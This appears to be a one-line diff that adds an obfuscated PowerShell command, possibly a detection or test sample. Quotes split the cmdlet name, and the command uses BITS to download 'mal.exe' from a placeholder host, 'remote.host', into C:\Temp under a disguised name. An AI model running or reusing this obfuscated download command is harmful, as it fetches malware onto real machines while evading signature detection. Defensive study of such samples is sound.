@@ -1,0 +1,1 @@
+powershell.exe -Command S"tar"t-Bi"t"s""Tra"ns"fer -Source http://remote.host/mal.exe -Destination C:\Temp\notmal.exe
